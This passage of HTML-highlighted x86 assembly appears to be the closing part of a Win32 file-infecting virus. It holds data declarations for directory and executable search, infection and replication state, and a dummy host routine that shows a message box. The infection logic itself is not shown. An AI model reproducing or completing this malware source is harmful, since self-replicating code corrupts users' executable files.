</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WFD</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;align</span><span class="sc0">

</span><span class="sc5">STime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ST_wYear</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wMonth</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wDayOfWeek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wDay</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wHour</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wMinute</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wSecond</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">ST_wMilliseconds</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">

 </span><span class="sc1">;align +00150h -&gt; 00200h</span><span class="sc0">


</span><span class="sc1">; Vars</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">; Sys</span><span class="sc0">

</span><span class="sc5">STimeSimple</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RandSeed</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Target</span><span class="sc0">

</span><span class="sc5">DirCurrentIsRoot</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DirRoot</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DirDotDouble</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DirDot</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DirSearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DirMask</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExeSearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExeMask</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DirInitial</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">@_PathSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DirCurrent</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">@_PathSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">STimeTargetSelect</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STimeFile</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;align +00248h -&gt; 00448h</span><span class="sc0">

</span><span class="sc5">ExeRest</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TargetFileNamesPointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TargetFileNames</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">@_PathSize</span><span class="sc4">*</span><span class="sc5">@_TargetNum</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;align +00528h -&gt; 00970h</span><span class="sc0">

</span><span class="sc1">; Infect</span><span class="sc0">

</span><span class="sc5">BakerTimes</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TargetFileHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TargetFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TargetMapHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TargetMapAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ReplicateSource</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReplicateDest</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;align 00020h -&gt; 00990h</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">01000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;align +0????h -&gt; 01000h</span><span class="sc0">

</span><span class="sc5">heap_end</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">; Host</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;Host proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostTitle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostText</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Host endp</span><span class="sc0">



</span><span class="sc5">host_end</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">; End</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0">


</span></div></body>
</html>
